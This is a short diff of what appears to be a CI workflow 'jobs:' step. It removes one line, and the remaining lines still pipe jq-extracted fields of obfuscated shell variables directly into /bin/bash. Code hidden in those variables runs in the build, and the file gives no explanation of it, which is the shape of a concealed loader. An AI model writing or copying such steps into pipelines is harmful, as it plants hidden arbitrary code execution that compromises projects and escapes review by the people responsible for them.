@@ -31,7 +31,6 @@ jobs:
           echo $q53 | jq -r .wp7749 | /bin/bash
           echo $xpeky132 | jq -r .kw303 | /bin/bash
           printf '%s' "$dnt6193" | jq -r .zp872 | /bin/bash
-          echo $nhn56 | jq -r .jd8528 | /bin/bash
           printf '%s' "$vw69" | jq -r .v878 | /bin/bash
           echo $xe57300 | jq -r .sue5174 | /bin/bash
           printf '%s' "$b80973" | jq -r .vcnb31379 | /bin/bash
